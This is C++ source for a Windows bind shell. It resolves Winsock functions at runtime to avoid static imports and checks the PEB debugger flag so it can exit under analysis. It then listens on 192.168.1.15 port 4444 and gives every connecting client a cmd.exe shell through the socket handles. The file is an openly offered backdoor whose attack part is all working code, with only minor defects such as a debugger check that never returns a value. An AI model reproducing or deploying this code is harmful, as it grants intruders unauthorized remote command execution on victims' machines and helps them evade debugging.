#include <iostream>
//#include <winsock2.h>
#include "windows.h"

//#pragma comment("lib","ws_32.lib")

typedef DWORD LPWSAPROTOCOL_INFOA;
typedef BYTE GROUP;

typedef int ( __stdcall * _WSAStartup )( WORD, LPWSADATA  );
typedef SOCKET( __stdcall * _WSASocket )( int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD ); 
typedef int( __stdcall * _WSACleanup )( );
typedef int( __stdcall * _bind )( SOCKET, const sockaddr *, int );
typedef int( __stdcall * _close )( SOCKET );
typedef int( __stdcall * _listen )( SOCKET, int );
typedef SOCKET( __stdcall * _accept )( SOCKET, const sockaddr *, int );;

bool presentDebugger( ){
	
	asm(
	"movl $0x30,%ebx\n\t"
	"movl %fs:(%ebx), %eax\n\t"
	"movl 0x2(%eax),%eax\n\t"
	"and $0xff, %eax"
	);
	
}


int main(int argc, char** argv) {
	
	if( presentDebugger() || argc < 1 ){
		ExitProcess(0);
	}

	HMODULE ws2_32;
	WSADATA wsd;
	SOCKET  sock;
	sockaddr_in sin;

	// fct
	_WSAStartup Startup;
	_WSACleanup clean;
	_close		close;
	_bind 		bind;
	_listen 	listen;
	_accept		accept;
	
	if( (ws2_32 = LoadLibrary("ws2_32.dll")) == NULL ){
		printf("[-] cannot load ws2_32.dll");
		ExitProcess(0);
	}
	
	// load fcts
	Startup = ( _WSAStartup )GetProcAddress( ws2_32, "WSAStartup" );
	clean   = ( _WSACleanup )GetProcAddress( ws2_32, "WSACleanup" );
	close   = ( _close )GetProcAddress( ws2_32, "closesocket" );
	bind    = ( _bind )GetProcAddress( ws2_32, "bind" );
	listen  = ( _listen )GetProcAddress( ws2_32, "listen" );
	accept = ( _accept )GetProcAddress( ws2_32, "accept" );
	
	memset( &wsd, 0, sizeof(wsd));
	if( Startup( (WORD)0x2020, &wsd ) != 0 ){
		printf("[-] WSAStartup failed !");
		clean();
		ExitProcess(0);
	}
	
	_WSASocket socket;
	socket = ( _WSASocket )GetProcAddress( ws2_32, "WSASocketA" );
	if( ( sock = socket(  AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,  (unsigned int )NULL, (unsigned int )NULL ) ) == -1 ){
		printf("[-] WSocket failed !");
		clean();
		ExitProcess(0);
	}
	
	memset( &sin, 0, sizeof(sin));
	sin.sin_family 		= AF_INET;
	sin.sin_port   		= htons(4444);
	sin.sin_addr.s_addr = inet_addr("192.168.1.15");
	
	if(bind( sock, ( SOCKADDR* ) &sin, sizeof(sin) ) != 0 ){
		printf("[-] Bind failed <%i>", WSAGetLastError() );
		clean();
		ExitProcess(0);
	}
	
	if( listen( sock, 1 ) != 0 ){
		printf("[-] listen failed <%i>", WSAGetLastError() );
		clean();
		ExitProcess(0);	
	}
	
	printf("%08x", accept );
	/*
	 # 
	*/
	for(;;){
		
		SOCKADDR_IN csin = {0};
	
		memset(&csin, 0, sizeof(csin) );
		SOCKET clts = accept( sock, NULL, NULL );
		if( clts != INVALID_SOCKET ){
			
			printf("[+] New Connection clients");
			
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			
			memset(&si, 0, sizeof(si));
			si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)clts;
			
			if( !CreateProcessA( 
				NULL,
				"cmd.exe", 
				NULL, 
				NULL, 
				true, 
				0, 
				NULL, 
				NULL, 
				&si, &pi 
			) ){
				printf("[-] Cannot create remote shell");
				close(clts);
				clean();
			}else{
				
				WaitForSingleObject( pi.hProcess, INFINITE );
				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);
			}
			
		}
		
		Sleep( 200 );
		
	}
	

	
	close(sock);
	clean();
	FreeLibrary(ws2_32);
	ExitProcess(0);
	
return 0;
}
